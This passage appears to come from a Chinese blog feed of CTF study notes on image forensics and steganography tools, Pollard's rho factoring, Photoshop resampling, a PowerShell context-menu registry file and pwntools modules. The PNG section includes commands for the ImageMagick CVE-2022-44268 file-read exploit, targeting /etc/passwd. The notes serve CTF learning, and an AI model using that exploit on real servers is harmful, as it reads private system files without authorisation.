class="line"><span class="keyword">for</span> idx, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(allimgs):</span><br><span class="line">    <span class="keyword">if</span> MODE == V_MODE:</span><br><span class="line">        newimg.paste(img, (<span class="number">0</span>, idx * height0, width0, (idx + <span class="number">1</span>) * height0))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        newimg.paste(img, (idx * width0, <span class="number">0</span>, (idx + <span class="number">1</span>) * width0, height0))</span><br><span class="line">newimg</span><br></pre></td></tr></table></figure>
<h2 id="拼图">拼图</h2>
<p>拼图问题我们可以使用
<code>gaps</code>，一个基于遗传算法的拼图求解器，具有块大小自动检测功能
(最好使用 Linux 安装)。<a href="https://github.com/nemanja-m/gaps">Gaps
Github 主页</a></p>
<p><code>gaps</code> 参数如下</p>
<table>
<thead>
<tr class="header">
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>--image</code></td>
<td>拼图路径</td>
</tr>
<tr class="even">
<td><code>--size</code></td>
<td>拼图大小 (以像素为单位)</td>
</tr>
<tr class="odd">
<td><code>--generations</code></td>
<td>遗传算法的代数</td>
</tr>
<tr class="even">
<td><code>--population</code></td>
<td>遗传算法中的人数</td>
</tr>
<tr class="odd">
<td><code>--verbose</code></td>
<td>在每一代之后显示最佳解决方案</td>
</tr>
<tr class="even">
<td><code>--save</code></td>
<td>将拼图结果另存为图像</td>
</tr>
</tbody>
</table>
<p>同时可以使用 <code>gaps --help</code> 获取更多帮助。</p>
<p>如果没有明确提供 <code>--size</code> 参数，<code>gaps</code>
会自动检测块的大小。</p>
<p>并且最好需要对小图块的长和宽分别进行尝试。（一般来说会使用最小值）</p>
<p>往往有时单次拼图得到的结果并不够好，可以进行多次拼图。</p>
<h2 id="自动化隐写探测">自动化隐写探测</h2>
<p>隐写工具 <code>zsteg</code> 可以检测 PNG 和 BMP 图片里的隐写数据，在
Linux 里可以直接安装使用。<a href="https://github.com/zed-0xff/zsteg">zsteg Github 主页</a></p>
<p>目前，<code>zsteg</code> 支持检测：</p>
<ul>
<li>LSB steganography in PNG &amp; BMP</li>
<li>zlib-compressed data</li>
<li>OpenStego</li>
<li>Camouflage 1.2.1</li>
<li>LSB with The Eratosthenes set</li>
</ul>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg 可疑图片.png</span><br></pre></td></tr></table></figure>
<p>如果想要查看更详细的信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg -a 可疑图片.png</span><br></pre></td></tr></table></figure>
<p>更多用法请使用 <code>zsteg -h</code> 或者查看 Github 主页。</p>
<h1 id="bmp-取证">BMP 取证</h1>
<h2 id="负高度">负高度</h2>
<p>BMP 图片的高度可以是负的，这将使得 <code>lines[]</code>
数组翻转（或者说原始图片翻转）。</p>
<h2 id="保留字节拼图">保留字节拼图</h2>
<p>在 BMP 头中存在四个保留字节，可能会被用于保存坐标，提取方式类似</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bfReserved1 = <span class="built_in">int</span>.from_bytes(imgdata[<span class="number">0x06</span>:<span class="number">0x08</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">bfReserved2 = <span class="built_in">int</span>.from_bytes(imgdata[<span class="number">0x08</span>:<span class="number">0x0a</span>], <span class="string">&#x27;little&#x27;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>拼图后一定要记得把图片顺序先理一遍哦。</p>
</blockquote>
<h2 id="pad_bytes">pad_bytes</h2>
<p>BMP 图片会把数据分成一行一行的，在文件格式中以 <code>lines[]</code>
数组保存，当图片的数据宽度小于每一行所分配的数据，那么会填充
<code>pad_bytes</code> 来保证数据格式读取的完整性。</p>
<p>那么我们可以在 BMP 图片的 <code>lines</code> 数组中隐写数据。</p>
<p>要计算 <code>pad_bytes</code>，需要从头中获取
<code>size</code>，<code>size</code> 需要减去头的大小，然后计算
<code>pad_size = size / height - width * 3</code> 即是
<code>pad_bytes</code> 数据。</p>
<h1 id="jpg-取证">JPG 取证</h1>
<h2 id="简述-1">简述</h2>
<p>以下的各种图片取证形式仅限于 JPG 图片格式。</p>
<h2 id="jphs">jphs</h2>
<p>一款 jpg 隐写软件，目前 Github 仓库已关闭 push，建议直接使用 jphs for
windows 软件，可以在 <a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm">http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm</a>
中获取。</p>
<blockquote>
<p>据说在国内常常使用。</p>
</blockquote>
<p>点击 <code>open jpeg</code> 打开图片后，可选 <code>pass phrase</code>
添加密码，然后点击 <code>hide</code> 或者 <code>seek</code>
即可进行隐写和数据提取。</p>
<h2 id="outguess">outguess</h2>
<p>outguess 是一款开源的隐写软件，支持对 jpeg 的数据隐写。</p>
<p>可以在 <a href="https://github.com/crorvick/outguess">Github
主页</a>中获取软件，也可以在 Linux 中使用包管理软件进行安装。</p>
<blockquote>
<p><code>sudo apt install outguess</code></p>
</blockquote>
<p>outguess
保留基于频率计数的统计信息，故一般的统计测试没有办法检测出通过该软件隐写的数据，故其隐写的隐蔽性极高。</p>
<p>加密：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -k password -d hidden.txt in.jpg out.jpg</span><br></pre></td></tr></table></figure>
<p>解密：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -k password -r out.jpg hidden.txt</span><br></pre></td></tr></table></figure>
<h2 id="thumbnail">thumbnail</h2>
<p><code>thumbnail</code> 是 exif 信息的一部分，是 JPG
图片用作显示的略缩图，但在现在的系统中往往不被使用。</p>
<h1 id="png-取证">PNG 取证</h1>
<h2 id="简述-2">简述</h2>
<p>以下的各种图片取证形式仅限于 PNG 图片格式。</p>
<h2 id="图片-ihdr-crc32-错误">图片 <code>IHDR</code> CRC32 错误</h2>
<p>一般情况下这是因为宽度或者高度被篡改的缘故，可以使用以下代码对图片的宽度或者长度进行爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_height</span>(<span class="params">filename:<span class="built_in">str</span>, needout:<span class="built_in">bool</span>=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pngdata = f.read()</span><br><span class="line">    height = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">20</span>:<span class="number">24</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    target = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">29</span>:<span class="number">33</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height+<span class="number">1</span>, <span class="number">0xFFFF</span>):</span><br><span class="line">        data = pngdata[<span class="number">12</span>:<span class="number">20</span>] + h.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + pngdata[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">if</span> binascii.crc32(data) == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Real height: <span class="subst">&#123;h&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> needout:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename + <span class="string">&quot;crack.png&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(pngdata[:<span class="number">12</span>] + data + pngdata[<span class="number">29</span>:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;height is real.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_width</span>(<span class="params">filename:<span class="built_in">str</span>, needout:<span class="built_in">bool</span>=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pngdata = f.read()</span><br><span class="line">    width = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">16</span>:<span class="number">20</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    target = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">29</span>:<span class="number">33</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width+<span class="number">1</span>, <span class="number">0xFFFF</span>):</span><br><span class="line">        data = pngdata[<span class="number">12</span>:<span class="number">16</span>] + w.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + pngdata[<span class="number">20</span>:<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">if</span> binascii.crc32(data) == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Real width: <span class="subst">&#123;w&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> needout:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename + <span class="string">&quot;crack.png&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(pngdata[:<span class="number">12</span>] + data + pngdata[<span class="number">29</span>:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;width is real.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_all</span>(<span class="params">filename:<span class="built_in">str</span>, needout:<span class="built_in">bool</span>=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pngdata = f.read()</span><br><span class="line">    width = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">16</span>:<span class="number">20</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    target = <span class="built_in">int</span>.from_bytes(pngdata[<span class="number">29</span>:<span class="number">33</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0xFFFF</span>):</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0XFFFF</span>):</span><br><span class="line">            data = pngdata[<span class="number">12</span>:<span class="number">16</span>] + w.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + h.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>) + pngdata[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">            <span class="keyword">if</span> binascii.crc32(data) == target:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Real width: <span class="subst">&#123;w&#125;</span>, Real height: <span class="subst">&#123;h&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> needout:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;crack_&quot;</span> + filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        f.write(pngdata[:<span class="number">12</span>] + data + pngdata[<span class="number">29</span>:])</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;width and heigth are real.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">filename = <span class="string">&#x27;false_height.png&#x27;</span></span><br><span class="line">crack_height(filename)</span><br></pre></td></tr></table></figure>
<h2 id="imagemagic">ImageMagic</h2>
<p>CVE-2022-44268，任意文件读取。</p>
<p>使用 ImageMagic 的 <code>convert</code> 功能转换成 PNG
图片时，会携带部分信息。</p>
<p>POC：<a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">https://github.com/Sybil-Scan/imagemagick-lfi-poc</a></p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 generate.py -f <span class="string">&quot;/etc/passwd&quot;</span> -o exploit.png</span><br></pre></td></tr></table></figure>
<p>利用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert exploit.png result.png</span><br></pre></td></tr></table></figure>
<p>获取到结果图片后，输入命令读取 PNG 携带的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">identify -verbose result.png</span><br></pre></td></tr></table></figure>
<h1 id="gif-取证">GIF 取证</h1>
<h2 id="简述-3">简述</h2>
<p>以下的各种图片取证形式仅限于 GIF 图片格式。</p>
<h2 id="gif-分离">GIF 分离</h2>
<p>如果需要对每一帧图片进行详细操作的话，最好使用 photoshop 打开 GIF
图片，PS 会自动将 GIF 图片的每一帧转换为图层。</p>
<p>如果只是想要查看每一帧的话，可以使用 Kinovea 或者 Stegsolve
来查看。</p>
<p>也可以使用在线网站获取每一帧：<a href="https://tu.sioe.cn/gj/fenjie/">https://tu.sioe.cn/gj/fenjie/</a></p>
<p>但是最简单的获取 GIF 每一帧图片的方式，可以通过使用
<code>convert</code> 软件 (Linux 软件)。</p>
<p>有关 <code>convert</code> 软件更多详情可以查看 <a href="https://imagemagick.org/">https://imagemagick.org/</a></p>
<p>以下只介绍 <code>convert</code> 分离 GIF 每一帧的用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert target.gif 输出名.png</span><br></pre></td></tr></table></figure>
<p>例如输入参数为
<code>convert target.gif flag.png</code>，那么软件将会把
<code>target.gif</code> 的每一帧转换为
<code>flag-0.png</code>、<code>flag-1.png</code> 等等，如图所示：</p>
<figure>
<img src="/picture-forensics-note/convert%20处理后.png" alt="convert 处理后">
<figcaption aria-hidden="true">convert 处理后</figcaption>
</figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>misc</tag>
        <tag>forensics</tag>
      </tags>
  </entry>
  <entry>
    <title>Pollard&#39;s rho method笔记</title>
    <url>//pollard-rho-method-note.html</url>
    <content><![CDATA[<h1 id="pollards-rho-method">Pollard's rho method</h1>
<h2 id="原理">原理</h2>
<h3 id="生日悖论">生日悖论</h3>
<p>在概率论中，生日问题要求在一组随机选择的 <span class="math inline">\(n\)</span>
个人中，至少有两人生日相同的概率。生日悖论指的是违反直觉的事实，即该概率超过
50% 只需要 23 个人 。</p>
<p>从条件概率原理的角度来看，可以知道 <span class="math display">\[
\begin{align}
\bar{p}(n)&amp;=1\times\left(1-\frac{1}{365}\right)\times\left(1-\frac{2}{365}\right)\times\cdots\times\left(1-\frac{n-1}{365}\right)\\
&amp;=\frac{365\times364\times\cdots\times(365-n+1)}{365^n}\\
&amp;=\frac{_{365}P_n}{365^n}
\end{align}
\]</span> 其中 <span class="math inline">\(_kP_n\)</span> 表示排列。</p>
<figure>
<img src="/pollard-rho-method-note/1024px-Birthdaymatch.svg.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="rho-method">rho method</h3>
<p>假设 <span class="math inline">\(N=pq\)</span>，其中 <span class="math inline">\(p\)</span> 为 <span class="math inline">\(N\)</span> 的一个非平凡因子，使用一个模 <span class="math inline">\(N\)</span> 多项式 <span class="math inline">\(g(x)\)</span> 生成随机序列 <span class="math inline">\(\{x_i\mod{N}\}\)</span>。</p>
<p>选择一个初始值 <span class="math inline">\(x=2\)</span>，计算 <span class="math inline">\(x_1=g(2),x_2=g(g(2)),\cdots\)</span>。</p>
<p>由于其为模 <span class="math inline">\(N\)</span>
多项式生成的序列值，故序列值必会重复。</p>
<p>而由生日悖论的原理可以知道，<span class="math inline">\(x_i\)</span>
重复出现的概率为 <span class="math inline">\(O(\sqrt{N})\)</span>。所以对于序列 <span class="math inline">\(\{x_i\mod{p}\}\)</span> 会更早地出现重复值。</p>
<p>当找到 <span class="math inline">\(x_{i1}\neq x_{i_2}\)</span> 但
<span class="math inline">\(x_{i1}= x_{i_2}\pmod{p}\)</span> 时，<span class="math inline">\(|x_{i1}-x_{i_2}|\)</span> 即为 <span class="math inline">\(p\)</span> 的倍数。</p>
<p>由于序列中的每个值只依赖于它之前的值，且构成的循环画在图上就像是希腊字母
<span class="math inline">\(\rho\)</span> 一样，故称为
<code>rho method</code>。</p>
<figure>
<img src="/pollard-rho-method-note/800px-Pollard_rho_cycle.svg.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>该算法的时间复杂度为 <span class="math inline">\(\displaystyle{O(N^{\frac{1}{4}}+\frac{N^{\frac{1}{4}}\alpha(N)}{\beta}+\beta\alpha(N))}\)</span>。</p>
<h3 id="floyd-判环法">Floyd 判环法</h3>
<p>Floyd 判环法又称龟兔赛跑法。</p>
<p>我们让 <span class="math inline">\(t,h\)</span>
指向起始序列值（一般选取 2），让 <span class="math inline">\(t\)</span>
和 <span class="math inline">\(h\)</span> 的移动速度不同，即每次 <span class="math inline">\(t=g(t)\)</span>，<span class="math inline">\(h=g(g(h))\)</span>，只要二者可以前进且没有相遇，就前进下去。</p>
<p>当 <span class="math inline">\(t=h\)</span>
时，可以确定已经进入到了环中。</p>
<p>在 <code>rho method</code> 中即 <span class="math inline">\(|t-h|\)</span> 为 <span class="math inline">\(p\)</span> 的倍数。</p>
<h3 id="brent-判环法">Brent 判环法</h3>
<p>Brent 判环法又称传送乌龟法。</p>
<p>我们让 <span class="math inline">\(t,h\)</span> 指向起始序列值，但
<span class="math inline">\(t\)</span> 先不动，<span class="math inline">\(h\)</span> 每次只走一步，即 <span class="math inline">\(h=g(h)\)</span>，在第 <span class="math inline">\(i\)</span> 次中最多走 <span class="math inline">\(2^i\)</span> 步，在二者没有相遇时就前进下去。当
<span class="math inline">\(h\)</span> 在本次移动完毕后，将 <span class="math inline">\(t\)</span> 移动到 <span class="math inline">\(h\)</span> 处，即 <span class="math inline">\(t=h\)</span>。</p>
<h2 id="实现">实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gcd</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">N</span>):</span><br><span class="line">    f = <span class="keyword">lambda</span> x: (x ** <span class="number">2</span> + <span class="number">1</span>) % N</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 加快入环速度</span></span><br><span class="line">        t = random.randint(<span class="number">2</span>, N)</span><br><span class="line">        h = f(t)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = gcd(<span class="built_in">abs</span>(<span class="built_in">int</span>(t) - <span class="built_in">int</span>(h)), N)</span><br><span class="line">            <span class="keyword">if</span> p == N:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, N // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                t = f(t)</span><br><span class="line">                h = f(f(h))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rho(<span class="number">15405314906656169587</span>))</span><br></pre></td></tr></table></figure>
<p>另一种判环法，效率相对高一些</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gcd</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">N</span>):</span><br><span class="line">    f = <span class="keyword">lambda</span> x: (x ** <span class="number">2</span> + <span class="number">1</span>) % N</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 加快入环速度</span></span><br><span class="line">        t = random.randint(<span class="number">2</span>, N)</span><br><span class="line">        h = f(t)</span><br><span class="line">        step_times = <span class="number">0</span></span><br><span class="line">        step_limit = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> step_times &lt; step_limit:</span><br><span class="line">                step_times = <span class="number">0</span></span><br><span class="line">                step_limit *= <span class="number">2</span></span><br><span class="line">                t = h</span><br><span class="line">                h = f(h)</span><br><span class="line">            p = gcd(<span class="built_in">abs</span>(<span class="built_in">int</span>(t) - <span class="built_in">int</span>(h)), N)</span><br><span class="line">            <span class="keyword">if</span> p == N:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, N // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                h = f(h)</span><br><span class="line">                step_times += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rho(<span class="number">14354303587370996407</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>crypto</tag>
        <tag>factor</tag>
      </tags>
  </entry>
  <entry>
    <title>ps 图像缩放功能笔记</title>
    <url>//ps-distort-note.html</url>
    <content><![CDATA[<h1 id="最邻近插值算法-nearest-neighbor-interpolation">最邻近插值算法
(nearest neighbor interpolation)</h1>
<p>最邻近插值算法是将目标图像各点的像素值设为源图像中与其最近的点。算法优点在与简单、速度快。</p>
<p>如果是图像放大，算法会将空白数据处采用最邻近的原像素填充。</p>
<p>如果是图像缩小，算法会选取最小像素块中的中心像素，而舍弃周围像素。</p>
<h1 id="ps-中的邻近采样">PS 中的邻近采样</h1>
<p>打开图片，点击 <code>图像-图像大小</code>，勾选 <code>重新采样</code>
后，采样算法选择
<code>邻近</code>，然后自由输入想要缩放到的大小即可。</p>
<p>一般默认期望为等比例缩放，若不为等比例缩放，邻近采样可能达不到想要的效果。</p>
<h2 id="操作示例">操作示例</h2>
<p>操作以下面这张图进行示例：</p>
<figure>
<img src="/ps-distort-note/before.png" alt="before">
<figcaption aria-hidden="true">before</figcaption>
</figure>
<p>打开图片后，选择 <code>图像-图像大小</code></p>
<figure>
<img src="/ps-distort-note/setting.png" alt="setting">
<figcaption aria-hidden="true">setting</figcaption>
</figure>
<p>我们因为是想要图片中的有颜色的像素点组成的图像，我们便使用
<code>邻近</code>
采样，将除了有颜色的像素点周围的像素舍弃，计算得到每5个像素中心便存在一个有颜色的像素点，即大小从
215x215 变更为 43x43</p>
<figure>
<img src="/ps-distort-note/setting2.png" alt="setting2">
<figcaption aria-hidden="true">setting2</figcaption>
</figure>
<p>最后生成我们需求的图片：</p>
<figure>
<img src="/ps-distort-note/after.png" alt="after">
<figcaption aria-hidden="true">after</figcaption>
</figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>misc</tag>
        <tag>photoshop</tag>
        <tag>distort</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell: 尝试新的跨平台 PowerShell https://aka.ms/pscore6</title>
    <url>//errors/pscore6-error.html</url>
    <content><![CDATA[<h1 id="错误分析">错误分析</h1>
<p>powershell 版本过老，提示更新</p>
<figure>
<img src="/errors/pscore6-error/pserror.png" alt="pserror">
<figcaption aria-hidden="true">pserror</figcaption>
</figure>
<h1 id="修复错误">修复错误</h1>
<p>进入 https://github.com/PowerShell/PowerShell/releases/
寻找合适的版本 (推荐最新版) 进行下载并安装</p>
<figure>
<img src="/errors/pscore6-error/psreleases.png" alt="psreleases">
<figcaption aria-hidden="true">psreleases</figcaption>
</figure>
<blockquote>
<p>可以按照以下步骤将 Powershell7 添加到鼠标右键选项中：</p>
<p>保存以下代码在 <code>pwsh.reg</code> 文件中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\pwsh7]</span><br><span class="line">@=&quot;在此处打开 Powershell7 窗口&quot;</span><br><span class="line">&quot;Extended&quot;=&quot;&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;C:\Program Files\PowerShell\7\pwsh.exe&quot;</span><br><span class="line">&quot;ShowBasedOnVelocityId&quot;=dword:00639bc8</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\pwsh7\command]</span><br><span class="line">@=&quot;C:\Program Files\PowerShell\7\pwsh.exe -noexit -command Set-Location -literalPath &#x27;%V&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>然后双击文件 <code>pwsh.reg</code> 即可</p>
</blockquote>
]]></content>
      <tags>
        <tag>windows</tag>
        <tag>error</tag>
        <tag>powershell</tag>
      </tags>
  </entry>
  <entry>
    <title>qrcode-note</title>
    <url>//qrcode-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
]]></content>
  </entry>
  <entry>
    <title>pwntools 笔记</title>
    <url>//pwntools-note.html</url>
    <content><![CDATA[<h1 id="pwntools-简述">Pwntools 简述</h1>
<p>Pwntools 是一个 CTF 框架和漏洞利用开发库。</p>
<p>它是用 Python
编写的，专为快速原型设计和开发而设计，旨在使漏洞利用编写尽可能简单。</p>
<p>我们可以使用 pip 包管理工具安装 <code>pwntools</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure>
<p>pwntools 需要及时使用最新版，我们可以使用以下命令对 pwntools
更新：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
<h1 id="pwntools-详解">Pwntools 详解</h1>
<h2 id="pwntools-模块索引"><code>pwntools</code> 模块索引</h2>
<table>
<colgroup>
<col style="width: 31%">
<col style="width: 68%">
</colgroup>
<thead>
<tr class="header">
<th>模块名称</th>
<th>模块功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>pwnlib.adb</code></td>
<td>adb 调试桥的封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.args</code></td>
<td>包含命令行参数的一些配置 (包含这个包后会自动从命令行中获取参数)</td>
</tr>
<tr class="odd">
<td><code>pwnlib.asm</code></td>
<td>通过 capstone 进行汇编的编译和反编译等功能的封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.atexception</code></td>
<td>包含未处理异常的回调函数</td>
</tr>
<tr class="odd">
<td><code>pwnlib.atexit</code></td>
<td>atexit 的替代品</td>
</tr>
<tr class="even">
<td><code>pwnlib.constants</code></td>
<td>头文件宏定义的封装，可以通过这个模块直接获取系统宏定义常数</td>
</tr>
<tr class="odd">
<td><code>pwnlib.config</code></td>
<td>Pwntools 配置变量</td>
</tr>
<tr class="even">
<td><code>pwnlib.context</code></td>
<td>包含运行时变量，上下文管理器</td>
</tr>
<tr class="odd">
<td><code>pwnlib.dynelf</code></td>
<td>通过内存 leak 数据自动化定位程序中函数位置</td>
</tr>
<tr class="even">
<td><code>pwnlib.encoders</code></td>
<td>Shellcode 编码工具封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.elf.config</code></td>
<td>elf 核心配置</td>
</tr>
<tr class="even">
<td><code>pwnlib.elf.corefile</code></td>
<td>elf 核心文件转储功能</td>
</tr>
<tr class="odd">
<td><code>pwnlib.elf.elf</code></td>
<td>elf 文件操作封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.exception</code></td>
<td>Pwnlib 异常</td>
</tr>
<tr class="odd">
<td><code>pwnlib.filepointer</code></td>
<td>FILE* 结构体封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.filesystem</code></td>
<td>通过 SSH 为本地文件系统和远程文件系统上的路径提供 Python2
的兼容接口</td>
</tr>
<tr class="odd">
<td><code>pwnlib.flag</code></td>
<td>CTF Flag 管理</td>
</tr>
<tr class="even">
<td><code>pwnlib.fmtstr</code></td>
<td>格式化字符串漏洞利用封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.gdb</code></td>
<td>GDB 调试封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.libcdb</code></td>
<td>Libc 数据库，可以通过一些信息查找对应的地址</td>
</tr>
<tr class="odd">
<td><code>pwnlib.log</code></td>
<td>日志库，跟 Pwntools 的操作</td>
</tr>
<tr class="even">
<td><code>pwnlib.memleak</code></td>
<td>内存泄漏管理工具</td>
</tr>
<tr class="odd">
<td><code>pwnlib.qemu</code></td>
<td>QEMU 适用工具封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.replacements</code></td>
<td>一些标准函数的替代品</td>
</tr>
<tr class="odd">
<td><code>pwnlib.rop.ret2dlresolve</code></td>
<td>提供缓冲区溢出利用的负载自动化生成工具</td>
</tr>
<tr class="even">
<td><code>pwnlib.rop.rop</code></td>
<td>ROP 生成工具，可以直接生成 32 位 ROP</td>
</tr>
<tr class="odd">
<td><code>pwnlib.rop.srop</code></td>
<td>Sigreturn 相关的利用封装</td>
</tr>
<tr class="even">
<td><code>pwnlib.runner</code></td>
<td>Shellcode 运行封装</td>
</tr>
<tr class="odd">
<td><code>pwnlib.shellcraft</code></td>
<td>Shellcode 生成工具</td>
</tr>
<tr class="even">
<td><code>pwnlib.shellcraft.aarch64</code></td>
<td>Shellcode for AArch64</td>
</tr>
